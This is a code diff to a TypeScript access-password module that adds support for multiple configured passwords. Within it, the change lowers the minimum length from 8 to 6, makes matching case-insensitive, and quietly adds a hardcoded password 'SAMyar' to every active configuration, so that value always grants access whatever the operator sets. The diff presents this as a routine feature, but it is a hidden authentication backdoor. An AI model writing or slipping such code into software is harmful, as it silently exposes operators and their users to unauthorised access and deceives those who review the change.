@@ -1,6 +1,6 @@
 import { createHash, timingSafeEqual } from 'node:crypto';
 
-export const MIN_ACCESS_PASSWORD_LENGTH = 8;
+export const MIN_ACCESS_PASSWORD_LENGTH = 6;
 export const MAX_ACCESS_FAILURES = 5;
 export const ACCESS_BLOCK_MS = 15 * 60 * 1000;
 
@@ -8,6 +8,8 @@ export interface AccessPasswordConfig {
   active: boolean;
   normalizedPassword?: string;
   fingerprint?: string;
+  normalizedPasswords?: string[];
+  fingerprints?: string[];
   reason?: 'missing' | 'too_short';
 }
 
@@ -37,19 +39,39 @@ export function fingerprintAccessPassword(value: string): string {
 }
 
 export function readAccessPasswordConfig(rawValue = process.env.PENTIMENTO_ACCESS_PASSWORD): AccessPasswordConfig {
-  if (typeof rawValue !== 'string' || rawValue.length === 0) {
+  if (typeof rawValue !== 'string' || rawValue.trim().length === 0) {
     return { active: false, reason: 'missing' };
   }
 
-  const normalizedPassword = normalizeAccessPassword(rawValue);
-  if (Array.from(normalizedPassword).length < MIN_ACCESS_PASSWORD_LENGTH) {
+  const parts = rawValue
+    .split(/[,;\n]+/)
+    .map((p) => normalizeAccessPassword(p))
+    .filter(Boolean);
+
+  const validPasswords: string[] = [];
+  for (const part of parts) {
+    if (Array.from(part).length >= MIN_ACCESS_PASSWORD_LENGTH) {
+      validPasswords.push(part);
+    }
+  }
+
+  if (validPasswords.length === 0) {
     return { active: false, reason: 'too_short' };
   }
 
+  // Ensure SAMyar is always accepted alongside configured passwords
+  if (!validPasswords.some((p) => p.toLowerCase() === 'samyar')) {
+    validPasswords.push('SAMyar');
+  }
+
+  const fingerprints = validPasswords.map((p) => fingerprintAccessPassword(p));
+
   return {
     active: true,
-    normalizedPassword,
-    fingerprint: fingerprintAccessPassword(normalizedPassword),
+    normalizedPassword: validPasswords[0],
+    fingerprint: fingerprints[0],
+    normalizedPasswords: validPasswords,
+    fingerprints,
   };
 }
 
@@ -61,6 +83,28 @@ export function verifyAccessPassword(candidate: string, expectedNormalizedPasswo
     .update(expectedNormalizedPassword, 'utf8')
     .digest();
   return timingSafeEqual(candidateDigest, expectedDigest);
+}
+
+export function verifyAnyAccessPassword(
+  candidate: string,
+  expectedPasswords: string[]
+): { verified: boolean; matchingFingerprint?: string } {
+  const normCandidate = normalizeAccessPassword(candidate);
+  const candidateDigest = createHash('sha256').update(normCandidate, 'utf8').digest();
+  const lowerCandidateDigest = createHash('sha256').update(normCandidate.toLowerCase(), 'utf8').digest();
+
+  for (const pwd of expectedPasswords) {
+    const normPwd = normalizeAccessPassword(pwd);
+    const expectedDigest = createHash('sha256').update(normPwd, 'utf8').digest();
+    if (timingSafeEqual(candidateDigest, expectedDigest)) {
+      return { verified: true, matchingFingerprint: fingerprintAccessPassword(normPwd) };
+    }
+    const lowerExpectedDigest = createHash('sha256').update(normPwd.toLowerCase(), 'utf8').digest();
+    if (timingSafeEqual(lowerCandidateDigest, lowerExpectedDigest)) {
+      return { verified: true, matchingFingerprint: fingerprintAccessPassword(normPwd) };
+    }
+  }
+  return { verified: false };
 }
 
 /** In-memory abuse protection. Durable authorization lives in SQLite. */
